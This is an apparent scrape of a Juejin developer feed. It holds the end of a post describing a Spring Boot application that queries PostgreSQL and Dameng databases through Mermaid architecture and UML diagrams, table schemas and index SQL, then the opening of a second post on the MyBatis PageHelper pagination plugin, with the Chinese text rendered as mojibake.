            DMDB[(Dameng DB :5236&lt;br/&gt;Database: ins_bus&lt;br/&gt;Tables:&lt;br/&gt;- T_USER&lt;br/&gt;- T_PRODUCT)]
        end
    end

    Browser --&gt;|HTTP| App
    RestClient --&gt;|HTTP| App
    App --&gt;|JDBC| PGDB
    App --&gt;|JDBC| DMDB

    style PGDB fill:#6495ED,color:#fff
    style DMDB fill:#DC143C,color:#fff
</code></pre>
<h3 data-id="heading-14">5. ç”¨ä¾‹è§†å›¾ (Use Case View)</h3>
<p>æè¿°ç³»ç»Ÿçš„åŠŸèƒ½éœ€æ±‚å’Œä½¿ç”¨åœºæ™¯ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Actor(User)
    Admin(Admin)

    subgraph "PostgreSQL åŒåº“æŸ¥è¯¢"
        UC1[æŸ¥è¯¢ç”¨æˆ·å¯è´­ä¹°äº§å“]
        UC2[æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ·äº§å“ç»„åˆ]
        UC3[ç»Ÿè®¡ç”¨æˆ·è´­ä¹°åŠ›]
    end

    subgraph "è¾¾æ¢¦åŒåº“æŸ¥è¯¢"
        UC4[æŸ¥è¯¢äº§å“æ½œåœ¨è´­ä¹°è€…]
        UC5[åˆ†æè´­ä¹°åŠ›]
        UC6[ç»Ÿè®¡äº§å“è´­ä¹°è€…]
    end

    subgraph "è·¨åº“è”åˆæŸ¥è¯¢"
        UC7[å¯¹æ¯”æ•°æ®åº“æ•°æ®]
        UC8[æ±‡æ€»æ‰€æœ‰æ•°æ®]
    end

    subgraph "æ•°æ®ç®¡ç†"
        UC9[åˆ›å»ºç”¨æˆ·]
        UC10[åˆ›å»ºäº§å“]
        UC11[æ›´æ–°æ•°æ®]
        UC12[åˆ é™¤æ•°æ®]
    end

    Actor --&gt; UC1
    Actor --&gt; UC2
    Actor --&gt; UC3
    Actor --&gt; UC4
    Actor --&gt; UC5
    Actor --&gt; UC6
    Actor --&gt; UC7
    Actor --&gt; UC8
    Admin --&gt; UC9
    Admin --&gt; UC10
    Admin --&gt; UC11
    Admin --&gt; UC12
</code></pre>
<hr/>
<h2 data-id="heading-15">UML 9 å›¾</h2>
<h3 data-id="heading-16">1. ç±»å›¾ (Class Diagram)</h3>
<p>æè¿°ç³»ç»Ÿçš„é™æ€ç»“æ„å’Œç±»ä¹‹é—´çš„å…³ç³»ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">classDiagram
    class UnifiedQueryController {
        -SameDatabaseJoinService sameDatabaseJoinService
        +getPgAffordableProducts() Map
        +getDmPurchasingPower() Map
        +compareDatabases() Map
    }

    class SameDatabaseJoinService {
        -UserRepository pgUserRepository
        -PgProductRepository pgProductRepository
        -DmUserRepository dmUserRepository
        -ProductRepository dmProductRepository
        +queryPgUserAffordableProducts() List
        +analyzeDmPurchasingPower() List
        +compareDataBetweenDatabases() Map
    }

    class UserRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +findById(String) User
        +queryUsersWithAffordableProducts() List
    }

    class PgProductRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +findById(String) PgProduct
    }

    class DmUserRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +findById(String) DmUser
    }

    class ProductRepository {
        -EasyEntityQuery easyEntityQuery
        +findAll() List
        +queryUsersForProduct(String) List
    }

    class User {
        &lt;&lt;entity&gt;&gt;
        -String id
        -String username
        -String email
        -Integer age
        -BigDecimal balance
    }

    class PgUser {
        &lt;&lt;entity&gt;&gt;
        @Table("t_user")
        -String id
        -String username
    }

    class DmUser {
        &lt;&lt;entity&gt;&gt;
        @Table("T_USER")
        -String id
        -String username
    }

    class Product {
        &lt;&lt;entity&gt;&gt;
        @Table("T_PRODUCT")
        -String id
        -String name
        -BigDecimal price
    }

    class PgProduct {
        &lt;&lt;entity&gt;&gt;
        @Table("t_product")
        -String id
        -String name
    }

    class DmProduct {
        &lt;&lt;entity&gt;&gt;
        @Table("T_PRODUCT")
        -String id
        -String name
    }

    UnifiedQueryController --&gt; SameDatabaseJoinService
    SameDatabaseJoinService --&gt; UserRepository
    SameDatabaseJoinService --&gt; PgProductRepository
    SameDatabaseJoinService --&gt; DmUserRepository
    SameDatabaseJoinService --&gt; ProductRepository

    UserRepository --&gt; User : manages
    PgProductRepository --&gt; PgProduct : manages
    DmUserRepository --&gt; DmUser : manages
    ProductRepository --&gt; Product : manages
</code></pre>
<h3 data-id="heading-17">2. å¯¹è±¡å›¾ (Object Diagram)</h3>
<p>æè¿°ç³»ç»Ÿåœ¨ç‰¹å®šæ—¶åˆ»çš„å¯¹è±¡çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph Controllers [Controllers]
        ctrl["UnifiedQueryController&lt;br/&gt;(instance)"]
    end

    subgraph Service [Service]
        svc["SameDatabaseJoinService&lt;br/&gt;(instance)"]
    end

    subgraph PGEs [PostgreSQL Entities]
        pgUser1["PgUser&lt;br/&gt;id: u001&lt;br/&gt;username: å¼ ä¸‰&lt;br/&gt;balance: 5000.00"]
        pgUser2["PgUser&lt;br/&gt;id: u004&lt;br/&gt;username: èµµå…­&lt;br/&gt;balance: 10000.00"]
        pgProd1["PgProduct&lt;br/&gt;id: p001&lt;br/&gt;name: æ™ºèƒ½æ‰‹æœº&lt;br/&gt;price: 2999.00"]
        pgProd2["PgProduct&lt;br/&gt;id: p008&lt;br/&gt;name: æœºæ¢°é”®ç›˜&lt;br/&gt;price: 799.00"]
    end

    subgraph DMEs [Dameng Entities]
        dmUser1["DmUser&lt;br/&gt;id: u001&lt;br/&gt;username: å¼ ä¸‰&lt;br/&gt;balance: 5000.00"]
        dmProd1["DmProduct&lt;br/&gt;id: p001&lt;br/&gt;name: æ™ºèƒ½æ‰‹æœº&lt;br/&gt;price: 2999.00"]
    end

    ctrl --&gt; svc
    svc --&gt; pgUser1
    svc --&gt; pgUser2
    svc --&gt; pgProd1
    svc --&gt; pgProd2
    svc --&gt; dmUser1
    svc --&gt; dmProd1
</code></pre>
<h3 data-id="heading-18">3. ç”¨ä¾‹å›¾ (Use Case Diagram)</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    User((ç”¨æˆ·))
    Admin((ç®¡ç†å‘˜))
    System(System)

    subgraph "PostgreSQL åŒåº“"
        PG1[æŸ¥è¯¢ç”¨æˆ·å¯è´­ä¹°äº§å“]
        PG2[æŸ¥è¯¢ç”¨æˆ·äº§å“ç»„åˆ]
        PG3[ç”¨æˆ·è´­ä¹°åŠ›ç»Ÿè®¡]
    end

    subgraph "è¾¾æ¢¦åŒåº“"
        DM1[æŸ¥è¯¢äº§å“è´­ä¹°è€…]
        DM2[è´­ä¹°åŠ›åˆ†æ]
        DM3[äº§å“è´­ä¹°è€…ç»Ÿè®¡]
    end

    subgraph "è·¨åº“"
        Cross1[æ•°æ®åº“æ•°æ®å¯¹æ¯”]
        Cross2[æ‰€æœ‰æ•°æ®æ±‡æ€»]
    end

    subgraph "ç®¡ç†"
        Mgmt1[æ•°æ®åˆå§‹åŒ–]
        Mgmt2[å¥åº·æ£€æŸ¥]
    end

    User --&gt; PG1
    User --&gt; PG2
    User --&gt; PG3
    User --&gt; DM1
    User --&gt; DM2
    User --&gt; DM3
    User --&gt; Cross1
    User --&gt; Cross2
    Admin --&gt; Mgmt1
    Admin --&gt; Mgmt2
</code></pre>
<h3 data-id="heading-19">4. åºåˆ—å›¾ (Sequence Diagram)</h3>
<p>æè¿° PostgreSQL åŒåº“æŸ¥è¯¢çš„æ—¶åºäº¤äº’ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant Client
    participant Controller
    participant Service
    participant PgUserRepo
    participant PgProductRepo
    participant PG

    Client-&gt;&gt;Controller: GET /api/query/pg/affordable-products
    Controller-&gt;&gt;Service: queryPgUserAffordableProducts()

    Service-&gt;&gt;PgUserRepo: queryable(PgUser.class).toList()
    PgUserRepo-&gt;&gt;PG: SELECT * FROM t_user
    PG--&gt;&gt;PgUserRepo: List&lt;PgUser&gt;
    PgUserRepo--&gt;&gt;Service: List&lt;PgUser&gt;

    Service-&gt;&gt;PgProductRepo: queryable(PgProduct.class).toList()
    PgProductRepo-&gt;&gt;PG: SELECT * FROM t_product
    PG--&gt;&gt;PgProductRepo: List&lt;PgProduct&gt;
    PgProductRepo--&gt;&gt;Service: List&lt;PgProduct&gt;

    Service-&gt;&gt;Service: Streamç»„åˆæŸ¥è¯¢
    Note over Service: where balance &gt;= price
    Service--&gt;&gt;Controller: List&lt;Map&gt;
    Controller--&gt;&gt;Client: JSON Response
</code></pre>
<h3 data-id="heading-20">5. æ´»åŠ¨å›¾ (Activity Diagram)</h3>
<p>æè¿°è·¨åº“æ•°æ®å¯¹æ¯”çš„ä¸šåŠ¡æµç¨‹ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    Start([å¼€å§‹]) --&gt; Receive[æ¥æ”¶å¯¹æ¯”è¯·æ±‚]

    Receive --&gt; QueryPG[æŸ¥è¯¢ PostgreSQL]
    Receive --&gt; QueryDM[æŸ¥è¯¢è¾¾æ¢¦æ•°æ®åº“]

    QueryPG --&gt; GetPGUsers[è·å–ç”¨æˆ·ç»Ÿè®¡]
    QueryPG --&gt; GetPGProducts[è·å–äº§å“ç»Ÿè®¡]
    QueryDM --&gt; GetDMUsers[è·å–ç”¨æˆ·ç»Ÿè®¡]
    QueryDM --&gt; GetDMProducts[è·å–äº§å“ç»Ÿè®¡]

    GetPGUsers --&gt; WaitPG[ç­‰å¾… PG å®Œæˆ]
    GetPGProducts --&gt; WaitPG
    GetDMUsers --&gt; WaitDM[ç­‰å¾… DM å®Œæˆ]
    GetDMProducts --&gt; WaitDM

    WaitPG --&gt; Combine[ç»„åˆç»“æœ]
    WaitDM --&gt; Combine

    Combine --&gt; Calculate[è®¡ç®—å·®å¼‚]
    Calculate --&gt; Build[æ„å»ºå“åº”]
    Build --&gt; End([è¿”å›å“åº”])
</code></pre>
<h3 data-id="heading-21">6. åä½œå›¾ (Communication Diagram)</h3>
<p>æè¿°è·¨åº“æŸ¥è¯¢çš„å¯¹è±¡é—´åä½œã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    Client[Client] --&gt;|1: compare| Controller[Controller]
    Controller --&gt;|2: compare| Service[Service]

    Service --&gt;|3: count| PGRepo[PG UserRepo]
    Service --&gt;|4: count| DMRepo[DM UserRepo]
    Service --&gt;|5: count| PGProdRepo[PG ProductRepo]
    Service --&gt;|6: count| DMProdRepo[DM ProductRepo]

    PGRepo --&gt;|7: result| Service
    DMRepo --&gt;|8: result| Service
    PGProdRepo --&gt;|9: result| Service
    DMProdRepo --&gt;|10: result| Service

    Service --&gt;|11: Map| Controller
    Controller --&gt;|12: JSON| Client
</code></pre>
<h3 data-id="heading-22">7. çŠ¶æ€å›¾ (State Diagram)</h3>
<p>æè¿°æ•°æ®æºåˆ‡æ¢çš„çŠ¶æ€å˜åŒ–ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">stateDiagram-v2
    [*] --&gt; Primary: å¯åŠ¨é»˜è®¤ PG
    Primary --&gt; Switching: @DataSource(DM)
    Switching --&gt; Dameng: åˆ‡æ¢åˆ° DM
    Switching --&gt; PostgreSQL: åˆ‡æ¢åˆ° PG

    Dameng --&gt; Querying: æ‰§è¡ŒæŸ¥è¯¢
    PostgreSQL --&gt; Querying: æ‰§è¡ŒæŸ¥è¯¢

    Querying --&gt; Primary: é‡ç½®ä¸ºé»˜è®¤
    Querying --&gt; Switching: ç»§ç»­åˆ‡æ¢
</code></pre>
<h3 data-id="heading-23">8. ç»„ä»¶å›¾ (Component Diagram)</h3>
<p>æè¿°ç³»ç»Ÿçš„ç‰©ç†ç»„ä»¶å’Œä¾èµ–å…³ç³»ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "Web Layer"
        REST[REST API]
    end

    subgraph "Business Layer"
        SameDb[Same-DB Join Service]
        CrossDb[Cross-DB Join Service]
    end

    subgraph "Data Access Layer"
        PG_UserRepo[PG User Repository]
        PG_ProdRepo[PG Product Repository]
        DM_UserRepo[DM User Repository]
        DM_ProdRepo[DM Product Repository]
    end

    subgraph "ORM Layer"
        EQ_PG[EasyQuery PG]
        EQ_DM[EasyQuery DM]
    end

    subgraph "Database Layer"
        PG[(PostgreSQL)]
        DM[(Dameng)]
    end

    REST --&gt; SameDb
    REST --&gt; CrossDb

    SameDb --&gt; PG_UserRepo
    SameDb --&gt; PG_ProdRepo
    SameDb --&gt; DM_UserRepo
    SameDb --&gt; DM_ProdRepo

    CrossDb --&gt; PG_UserRepo
    CrossDb --&gt; DM_ProdRepo

    PG_UserRepo --&gt; EQ_PG
    PG_ProdRepo --&gt; EQ_PG
    DM_UserRepo --&gt; EQ_DM
    DM_ProdRepo --&gt; EQ_DM

    EQ_PG --&gt; PG
    EQ_DM --&gt; DM
</code></pre>
<h3 data-id="heading-24">9. éƒ¨ç½²å›¾ (Deployment Diagram)</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "å®¢æˆ·ç«¯"
        Client[Web Browser/REST Client]
    end

    subgraph "åº”ç”¨æœåŠ¡å™¨ :8080"
        App[Spring Boot Application]
        JVM[JDK 21]
        App -.è¿è¡Œ.-&gt; JVM
    end

    subgraph "PostgreSQL æœåŠ¡å™¨ :5432"
        PGIns[æ•°æ®åº“å®ä¾‹]
        PGDB[(ins_bus&lt;br/&gt;t_user&lt;br/&gt;t_product)]
        PGIns -.å­˜å‚¨.-&gt; PGDB
    end

    subgraph "è¾¾æ¢¦æ•°æ®åº“æœåŠ¡å™¨ :5236"
        DMIns[æ•°æ®åº“å®ä¾‹]
        DMDB[(ins_bus&lt;br/&gt;T_USER&lt;br/&gt;T_PRODUCT)]
        DMIns -.å­˜å‚¨.-&gt; DMDB
    end

    Client --&gt;|HTTP| App
    App --&gt;|JDBC| PGIns
    App --&gt;|JDBC| DMIns

    style PGDB fill:#6495ED,color:#fff
    style DMDB fill:#DC143C,color:#fff
</code></pre>
<hr/>
<h2 data-id="heading-25">æ•°æ®åº“è®¾è®¡</h2>
<h3 data-id="heading-26">åŒåº“åŒè¡¨æ¶æ„</h3>
<p>æœ¬é¡¹ç›®é‡‡ç”¨åŒåº“åŒè¡¨æ¶æ„ï¼Œæ¯ä¸ªæ•°æ®åº“éƒ½åŒ…å«å®Œæ•´çš„ç”¨æˆ·å’Œäº§å“è¡¨ï¼š</p>























<table><thead><tr><th>æ•°æ®åº“</th><th>ç”¨æˆ·è¡¨</th><th>äº§å“è¡¨</th><th>è¡¨åè§„èŒƒ</th></tr></thead><tbody><tr><td><strong>PostgreSQL</strong></td><td><code>t_user</code></td><td><code>t_product</code></td><td>å°å†™+ä¸‹åˆ’çº¿</td></tr><tr><td><strong>è¾¾æ¢¦æ•°æ®åº“</strong></td><td><code>T_USER</code></td><td><code>T_PRODUCT</code></td><td>å¤§å†™+ä¸‹åˆ’çº¿</td></tr></tbody></table>
<h3 data-id="heading-27">è¡¨ç»“æ„è®¾è®¡</h3>
<h4 data-id="heading-28">PostgreSQL ç”¨æˆ·è¡¨ (t_user)</h4>





















































<table><thead><tr><th>å­—æ®µå</th><th>ç±»å‹</th><th>çº¦æŸ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>ç”¨æˆ·ID</td></tr><tr><td>username</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>ç”¨æˆ·å</td></tr><tr><td>email</td><td>VARCHAR(100)</td><td/><td>é‚®ç®±</td></tr><tr><td>age</td><td>INTEGER</td><td/><td>å¹´é¾„</td></tr><tr><td>balance</td><td>DECIMAL(10,2)</td><td/><td>ä½™é¢</td></tr><tr><td>create_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>update_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>æ›´æ–°æ—¶é—´</td></tr></tbody></table>
<h4 data-id="heading-29">PostgreSQL äº§å“è¡¨ (t_product)</h4>





















































<table><thead><tr><th>å­—æ®µå</th><th>ç±»å‹</th><th>çº¦æŸ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>id</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>äº§å“ID</td></tr><tr><td>name</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>äº§å“åç§°</td></tr><tr><td>description</td><td>VARCHAR(500)</td><td/><td>äº§å“æè¿°</td></tr><tr><td>price</td><td>DECIMAL(10,2)</td><td>NOT NULL</td><td>ä»·æ ¼</td></tr><tr><td>stock</td><td>INTEGER</td><td>NOT NULL</td><td>åº“å­˜</td></tr><tr><td>create_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>update_time</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>æ›´æ–°æ—¶é—´</td></tr></tbody></table>
<h4 data-id="heading-30">è¾¾æ¢¦ç”¨æˆ·è¡¨ (T_USER)</h4>





















































<table><thead><tr><th>å­—æ®µå</th><th>ç±»å‹</th><th>çº¦æŸ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ID</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>ç”¨æˆ·ID</td></tr><tr><td>USERNAME</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>ç”¨æˆ·å</td></tr><tr><td>EMAIL</td><td>VARCHAR(100)</td><td/><td>é‚®ç®±</td></tr><tr><td>AGE</td><td>INTEGER</td><td/><td>å¹´é¾„</td></tr><tr><td>BALANCE</td><td>DECIMAL(10,2)</td><td/><td>ä½™é¢</td></tr><tr><td>CREATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>UPDATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>æ›´æ–°æ—¶é—´</td></tr></tbody></table>
<h4 data-id="heading-31">è¾¾æ¢¦äº§å“è¡¨ (T_PRODUCT)</h4>





















































<table><thead><tr><th>å­—æ®µå</th><th>ç±»å‹</th><th>çº¦æŸ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ID</td><td>VARCHAR(50)</td><td>PRIMARY KEY</td><td>äº§å“ID</td></tr><tr><td>NAME</td><td>VARCHAR(100)</td><td>NOT NULL</td><td>äº§å“åç§°</td></tr><tr><td>DESCRIPTION</td><td>VARCHAR(500)</td><td/><td>äº§å“æè¿°</td></tr><tr><td>PRICE</td><td>DECIMAL(10,2)</td><td>NOT NULL</td><td>ä»·æ ¼</td></tr><tr><td>STOCK</td><td>INTEGER</td><td>NOT NULL</td><td>åº“å­˜</td></tr><tr><td>CREATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>åˆ›å»ºæ—¶é—´</td></tr><tr><td>UPDATE_TIME</td><td>TIMESTAMP</td><td>DEFAULT CURRENT_TIMESTAMP</td><td>æ›´æ–°æ—¶é—´</td></tr></tbody></table>
<h3 data-id="heading-32">ç´¢å¼•è®¾è®¡</h3>
<h4 data-id="heading-33">PostgreSQL ç´¢å¼•</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç”¨æˆ·è¡¨ç´¢å¼•</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_username <span class="hljs-keyword">ON</span> t_user(username);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_email <span class="hljs-keyword">ON</span> t_user(email);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_age <span class="hljs-keyword">ON</span> t_user(age);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_balance <span class="hljs-keyword">ON</span> t_user(balance);

<span class="hljs-comment">-- äº§å“è¡¨ç´¢å¼•</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_product_name <span class="hljs-keyword">ON</span> t_product(name);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_product_price <span class="hljs-keyword">ON</span> t_product(price);
<span class="hljs-keyword">CREATE</span> INDEX idx_pg_product_stock <span class="hljs-keyword">ON</span> t_product(stock);
</code></pre>
<h4 data-id="heading-34">è¾¾æ¢¦ç´¢å¼•</h4>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- ç”¨æˆ·è¡¨ç´¢å¼•</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_username <span class="hljs-keyword">ON</span> T_USER(USERNAME);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_email <span class="hljs-keyword">ON</span> T_USER(EMAIL);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_age <span class="hljs-keyword">ON</span> T_USER(AGE);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_balance <span class="hljs-keyword">ON</span> T_USER(BALANCE);

<span class="hljs-comment">-- äº§å“è¡¨ç´¢å¼•</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_product_name <span class="hljs-keyword">ON</span> T_PRODUCT(NAME);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_product_price <span class="hljs-keyword">ON</span> T_PRODUCT(PRICE);
<span class="hljs-keyword">CREATE</span> INDEX idx_dm_product_stock <span class="hljs-keyword">ON</span> T_PRODUCT(STOCK);
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis åˆ†é¡µæ’ä»¶PageHelper]]></title>    <link>https://juejin.cn/post/7595142651727855635</link>    <guid>https://juejin.cn/post/7595142651727855635</guid>    <pubDate>2026-01-15T08:31:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651727855635" data-draft-id="7595178023256113171" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis åˆ†é¡µæ’ä»¶PageHelper"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T08:31:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å‘¨åœ¨æˆé•¿"/> <meta itemprop="url" content="https://juejin.cn/user/3632442150752573"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis åˆ†é¡µæ’ä»¶PageHelper
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3632442150752573/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å‘¨åœ¨æˆé•¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:31:14.000Z" title="Thu Jan 15 2026 08:31:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>PageHelper è¯¦è§£</strong></h2>
<h3 data-id="heading-1"><strong>ä¸€ã€PageHelper æ˜¯ä»€ä¹ˆï¼Ÿ</strong></h3>
<p>PageHelper æ˜¯ä¸€ä¸ª MyBatis çš„<strong>ç‰©ç†åˆ†é¡µæ’ä»¶</strong>ï¼Œå®ƒé€šè¿‡æ‹¦æˆª MyBatis çš„ SQL æ‰§è¡Œè¿‡ç¨‹ï¼Œè‡ªåŠ¨ä¸º SQL æ·»åŠ åˆ†é¡µè¯­å¥ï¼Œè®©å¼€å‘è€…æ— éœ€æ‰‹åŠ¨ç¼–å†™åˆ†é¡µ SQLã€‚</p>
